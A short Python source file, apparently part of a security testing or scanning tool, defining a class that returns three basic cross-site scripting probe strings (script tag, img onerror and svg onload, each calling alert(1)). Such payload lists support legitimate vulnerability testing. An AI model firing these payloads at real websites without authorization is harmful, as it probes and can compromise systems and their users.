class Payloads:
    def __init__(self):
        self.payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "'><svg/onload=alert(1)>"
        ]
    
    def get_payloads(self):
        return self.payloads
